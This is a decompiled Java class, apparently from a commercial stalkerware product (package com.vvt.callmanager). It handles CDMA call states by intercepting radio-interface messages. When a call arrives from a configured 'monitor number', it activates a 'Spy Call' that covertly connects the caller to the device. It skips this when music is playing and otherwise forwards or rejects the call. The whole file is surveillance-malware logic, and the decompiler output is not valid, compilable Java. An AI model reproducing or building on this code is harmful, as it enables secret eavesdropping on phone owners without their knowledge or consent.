package com.vvt.callmanager.filter;

import android.media.AudioManager;
import android.os.Parcel;
import com.vvt.callmanager.a.d;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.mitm.a;
import com.vvt.callmanager.ref.BugEngineCallState;
import com.vvt.callmanager.ref.MonitorDisconnectData;
import com.vvt.callmanager.ref.MonitorDisconnectData.Reason;
import com.vvt.callmanager.ref.MonitorNumber;
import com.vvt.callmanager.ref.f;
import java.util.ArrayList;

 enum FilterCdmaCall$CallState$1
{
  private boolean isWaitingForResponse;
  private d monitorCallInfo;
  
  FilterCdmaCall$CallState$1()
  {
    super(paramString, paramInt, null);
  }
  
  private FilterCdmaCall.CallState a(d paramd)
  {
    Object localObject1 = null;
    boolean bool1 = true;
    Object localObject2 = FilterCdmaCall.b(this.mFilterCall);
    Object localObject3 = paramd.d();
    localObject3 = ((f)localObject2).b((String)localObject3);
    boolean bool2;
    Object localObject4;
    boolean bool3;
    if (localObject3 != null)
    {
      bool2 = ((MonitorNumber)localObject3).isEnabled();
      if (bool2)
      {
        bool2 = bool1;
        if (!bool2) {
          break label312;
        }
        localObject2 = this.mFilterCall;
        localObject4 = "Found active monitor!";
        FilterCdmaCall.a((FilterCdmaCall)localObject2, (String)localObject4);
        localObject2 = FilterCdmaCall.c(this.mFilterCall);
        bool3 = ((AudioManager)localObject2).isMusicActive();
        bool2 = ((MonitorNumber)localObject3).isSpyEnabled();
        if ((!bool2) || (bool3)) {
          break label178;
        }
        bool2 = bool1;
        label106:
        if (!bool2) {
          break label187;
        }
        FilterCdmaCall.a(this.mFilterCall, "Activate Spy Call");
        this.monitorCallInfo = paramd;
        localObject2 = i.a(i.i);
        FilterCdmaCall.a(this.mFilterCall).a((Parcel)localObject2);
        localObject1 = this.mFilterCall;
        ((FilterCdmaCall)localObject1).d((Parcel)localObject2);
        this.isWaitingForResponse = bool1;
      }
    }
    for (localObject2 = IDLE;; localObject2 = DIALING_RINGING)
    {
      return (FilterCdmaCall.CallState)localObject2;
      bool2 = false;
      localObject2 = null;
      break;
      label178:
      bool2 = false;
      localObject2 = null;
      break label106;
      label187:
      localObject3 = this.mFilterCall;
      String str = "%s -> Reject Spy Call";
      Object[] arrayOfObject = new Object[bool1];
      if (bool3) {}
      for (localObject2 = "Music is playing";; localObject2 = "Spy Call is disabled")
      {
        arrayOfObject[0] = localObject2;
        localObject2 = String.format(str, arrayOfObject);
        FilterCdmaCall.a((FilterCdmaCall)localObject3, (String)localObject2);
        localObject2 = this.mFilterCall;
        localObject1 = FilterCdmaCall.a(this.mFilterCall);
        i.d((n)localObject2, (m)localObject1);
        if (bool3)
        {
          localObject2 = this.mFilterCall;
          localObject1 = new com/vvt/callmanager/ref/MonitorDisconnectData;
          localObject3 = this.monitorCallInfo.d();
          localObject4 = MonitorDisconnectData.Reason.MUSIC_PLAY;
          ((MonitorDisconnectData)localObject1).<init>((String)localObject3, (MonitorDisconnectData.Reason)localObject4);
          FilterCdmaCall.a((FilterCdmaCall)localObject2, (MonitorDisconnectData)localObject1);
        }
        this.isWaitingForResponse = bool1;
        break;
      }
      label312:
      FilterCdmaCall.a(this.mFilterCall, "Forward ringing message");
      localObject2 = this.mFilterCall;
      bool1 = false;
      i.a((n)localObject2, null);
    }
  }
  
  public void onEnter(Object paramObject)
  {
    boolean bool = FilterCdmaCall.b();
    if (bool) {}
    this.monitorCallInfo = null;
    this.isWaitingForResponse = false;
    FilterCdmaCall localFilterCdmaCall = this.mFilterCall;
    BugEngineCallState localBugEngineCallState = BugEngineCallState.CDMA_IDLE;
    FilterCdmaCall.a(localFilterCdmaCall, localBugEngineCallState);
  }
  
  public Object onExit()
  {
    boolean bool = FilterCdmaCall.b();
    if (bool) {}
    return this.monitorCallInfo;
  }
  
  public FilterCdmaCall.CallState processResponse(Parcel paramParcel)
  {
    int i = 1;
    float f = Float.MIN_VALUE;
    int j = 0;
    Object localObject1 = FilterCdmaCall.a(this.mFilterCall);
    int k = ((m)localObject1).c(paramParcel);
    int m = 1001;
    FilterCdmaCall localFilterCdmaCall;
    if (k == m)
    {
      localObject1 = FilterCdmaCall.a(this.mFilterCall);
      localFilterCdmaCall = this.mFilterCall;
      i.a((m)localObject1, localFilterCdmaCall);
      localObject1 = this;
      if (j != 0)
      {
        localFilterCdmaCall = this.mFilterCall;
        localFilterCdmaCall.c(paramParcel);
      }
      return (FilterCdmaCall.CallState)localObject1;
    }
    m = 9;
    if (k == m)
    {
      localObject1 = l.a(paramParcel);
      k = ((l)localObject1).b;
      m = 134744072;
      if (k != m)
      {
        m = i;
        label120:
        Object localObject2 = d.a(paramParcel);
        Object localObject3 = FilterCdmaCall.a(this.mFilterCall).a();
        i.a("FilterCall", (ArrayList)localObject2, (a)localObject3);
        k = 0;
        localObject1 = null;
        if (localObject2 != null)
        {
          i1 = ((ArrayList)localObject2).size();
          if (i1 == i) {
            localObject1 = (d)((ArrayList)localObject2).get(0);
          }
        }
        if (localObject1 == null) {
          break label353;
        }
        int i2 = ((d)localObject1).c();
        int i1 = 4;
        if (i2 != i1) {
          break label353;
        }
        localObject2 = this.mFilterCall;
        localObject3 = "Get calling from: %s";
        Object localObject4 = new Object[i];
        String str = ((d)localObject1).d();
        localObject4[0] = str;
        localObject4 = String.format((String)localObject3, (Object[])localObject4);
        FilterCdmaCall.a((FilterCdmaCall)localObject2, (String)localObject4);
      }
    }
    label353:
    for (localObject1 = a((d)localObject1);; localObject1 = this)
    {
      j = m;
      break;
      m = 0;
      localFilterCdmaCall = null;
      break label120;
      boolean bool = this.isWaitingForResponse;
      if (bool)
      {
        bool = i.a(k);
        if (bool)
        {
          this.isWaitingForResponse = false;
          localObject1 = IDLE;
          break;
        }
      }
      bool = this.isWaitingForResponse;
      if (bool)
      {
        int n = 40;
        if (k == n)
        {
          this.isWaitingForResponse = false;
          localObject1 = SPYING;
          break;
        }
      }
      j = i;
      localObject1 = this;
      break;
    }
  }
  
  public FilterCdmaCall.CallState processRilRequest(Parcel paramParcel)
  {
    Object localObject = FilterCdmaCall.a(this.mFilterCall);
    int i = ((m)localObject).b(paramParcel);
    int j = 10;
    if (i == j) {}
    for (localObject = DIALING_RINGING;; localObject = this)
    {
      this.mFilterCall.d(paramParcel);
      return (FilterCdmaCall.CallState)localObject;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterCdmaCall$CallState$1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */